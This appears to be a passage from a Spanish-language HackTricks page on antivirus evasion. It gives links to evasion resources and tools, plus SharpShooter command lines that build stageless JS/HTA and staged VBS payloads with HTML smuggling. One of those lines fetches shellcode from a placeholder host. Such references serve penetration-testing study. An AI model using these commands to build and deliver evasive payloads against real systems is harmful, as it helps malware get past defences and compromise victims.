* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python para construir ejemplos de inyectores:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otras herramientas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Más

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si estás interesado en una **carrera de hacking** y hackear lo inhackeable - **¡estamos contratando!** (_se requiere polaco fluido escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
